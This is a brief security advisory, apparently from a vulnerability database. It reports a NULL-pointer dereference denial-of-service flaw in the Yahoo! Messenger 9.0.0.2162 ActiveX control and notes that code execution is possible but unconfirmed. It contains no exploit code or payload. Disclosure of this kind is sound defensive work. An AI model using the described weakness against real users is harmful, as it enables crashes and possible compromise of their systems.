Yahoo! Messenger is prone to a denial-of-service vulnerability because of a NULL-pointer dereference error.

A successful attack allows a remote attacker to crash the application using the ActiveX control (typically Internet Explorer), denying further service to legitimate users. Given the nature of this issue, the attacker may also be able to run arbitrary code, but this has not been confirmed.

Yahoo! Messenger 9.0.0.2162 is vulnerable; other versions may also be affected.
